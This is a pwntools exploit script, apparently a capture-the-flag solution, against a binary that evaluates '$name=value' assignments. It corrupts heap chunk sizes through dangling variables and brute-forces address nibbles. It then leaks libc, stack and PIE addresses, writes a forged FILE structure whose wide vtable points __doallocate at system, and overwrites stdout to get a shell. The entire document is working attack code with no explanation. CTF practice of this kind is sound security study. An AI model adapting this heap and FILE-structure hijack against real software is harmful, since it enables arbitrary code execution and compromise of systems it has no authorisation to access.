from pwn import *

elf = ELF("./main_patched")
libc = ELF("./libc")
ld = ELF("./ld")

context.binary = elf
context.terminal = ['konsole', '-e']

# p = remote("tcp.ybn.sg", 10798)
p = process()
gdb.attach(p, "set glibc 2.41")

def modify_var_raw(name, data):
    payload = b"$" + name.encode() + b"*=" + data
    p.sendlineafter(b'> \n', payload)

def create(name, data):
    payload = f"${name}={data}"
    p.sendlineafter(b'> \n', payload)

def hint(name):
    p.sendlineafter(b'> \n', f"hint({name})".encode())
    p.recvuntil(b": ")
    leak_str = p.recvuntil(b"\n", drop=True)
    return int(leak_str)

# context.log_level = 'debug'

create("A", "A"*24)
create("GhostA", "A"*24)  
create("A", "0")          
create("Writer", "W"*24) 
# p.interactive()
create('target', '1')

create("B", "1")         
create('target', 'x' * 0x420)
create("B", "B" * 24)         
create("GhostB", "B"*24)   
create("B", "0")           
create("Victim", "V"*24)   

writer_nibble = hint("Writer")

log.info("Step 3: Corrupt Barrier Size")

target_page_offset = 0x468

target_addr_lsb = (writer_nibble << 12) | target_page_offset
modify_var_raw("GhostA", p16(target_addr_lsb))
modify_var_raw("Writer", p64(0x461))
create("target", "0")
create("Padding", "P" * 0x3d0)

libc_nibble = hint("Victim")

def modify_var_blind(name, data):
    payload = b"$" + name.encode() + b"*=" + data
    p.sendline(payload) 

target_nibble = (libc_nibble + 1) & 0xF
target_lower_12 = 0x5c0
target_addr_lsb = (target_nibble << 12) | target_lower_12
modify_var_raw("GhostB", p16(target_addr_lsb))
modify_var_raw("Victim", b'\x01\x18')

pause()

target_base_lsb = (target_addr_lsb + 0x20)
modify_var_blind("GhostB", p16(target_base_lsb))
modify_var_blind("Victim", b"\x01")
p.recvuntil(b'> ')
p.recvuntil(b'> ')
libc.address = u64((b'\x00' + p.recv(5)).ljust(8, b'\x00')) - 2004480
p.sendline(b'')
print(hex(libc.address))

target_base_lsb = (target_addr_lsb + 0x20)
modify_var_blind("GhostB", p16(target_base_lsb+0x8))
modify_var_blind("Victim", pack(libc.symbols['environ'] + 8))
p.recvuntil(b'> ')
p.recvuntil(b'> ')
p.recvuntil(b'> ')
leak = p.recvuntil(b'> ')
stack = u64(leak[-10:-2])
print(hex(stack))
p.sendline(b'')
p.sendline(b'')
context.log_level = 'debug'
modify_var_raw("GhostB", p16(target_addr_lsb))
modify_var_raw("Victim", b'\x08\x18')
modify_var_blind("GhostB", p16(target_base_lsb))
modify_var_blind("Victim", pack(stack- 4432))
modify_var_blind("GhostB", p16(target_base_lsb + 8))
modify_var_blind("Victim", pack(stack- 4432 + 8))
modify_var_blind("GhostB", p16(target_addr_lsb))
modify_var_blind("Victim", b'\x01\x18')
p.sendlineafter(b'> ', b'')
pie_base = u64(p.recv(8)) - elf.symbols['main'] - 63
# p.interactive()

def write_payload(base_addr, payload):
    idx = 0
    length = len(payload)
    
    while idx < length:
        if payload[idx] == 0:
            idx += 1
            continue
            
        start = idx
        while idx < length and payload[idx] != 0:
            idx += 1
        
        chunk = payload[start:idx]
        current_target_addr = base_addr + start
        
        pointer_payload = p64(current_target_addr)
        
        if pointer_payload[0] == 0:
            modify_var_blind("GhostB", p64(current_target_addr - 1))
            modify_var_blind("Victim", b'A' + chunk)
        else:
            modify_var_blind("GhostB", pointer_payload)
            modify_var_blind("Victim", chunk)

def set_val(arr, offset, val):
    val_bytes = val if isinstance(val, bytes) else p64(val)
    for i, b in enumerate(val_bytes):
        arr[offset + i] = b

def find_nonzero_addr(start, size, align=0x10):
    addr = start
    end = start + size
    while addr < end:
        if b"\x00" not in p64(addr)[:6]:
            return addr
        addr += align
    return None

stdout_ptr = pie_base + elf.symbols['stdout']
system_addr = libc.symbols['system']
wfile_jumps = libc.symbols['_IO_wfile_jumps']
stdout_lock = libc.symbols['_IO_stdfile_1_lock']

bss_base = libc.bss() + 0x800
region_size = 0x8000

fake_file = find_nonzero_addr(bss_base, region_size)
fake_wide = find_nonzero_addr(fake_file + 0x400, region_size)
fake_wvt = find_nonzero_addr(fake_wide + 0x400, region_size)

log.info(f"fake_file: {hex(fake_file)}")
log.info(f"fake_wide: {hex(fake_wide)}")
log.info(f"fake_wvt: {hex(fake_wvt)}")

wide_data = bytearray(0x100)
wide_vtable = bytearray(0x100)
set_val(wide_data, 0xe0, p64(fake_wvt))      # _wide_vtable
set_val(wide_vtable, 0x68, p64(system_addr)) # __doallocate -> system

write_payload(fake_wide, wide_data)
write_payload(fake_wvt, wide_vtable)

file_struct = bytearray(0x200)
set_val(file_struct, 0x00, b"  sh")      # _flags (avoid 0x2/0x8/0x20 bits)
set_val(file_struct, 0x20, p64(fake_wide))   # _IO_write_base
set_val(file_struct, 0x28, p64(fake_wide))   # _IO_write_ptr
set_val(file_struct, 0x30, p64(fake_wide))   # _IO_write_end
set_val(file_struct, 0x88, p64(stdout_lock)) # _lock
set_val(file_struct, 0xa0, p64(fake_wide))   # _wide_data
set_val(file_struct, 0xd8, p64(wfile_jumps)) # vtable

write_payload(fake_file, file_struct)

write_payload(stdout_ptr, p64(fake_file))

p.sendline(b"ls")
p.interactive()
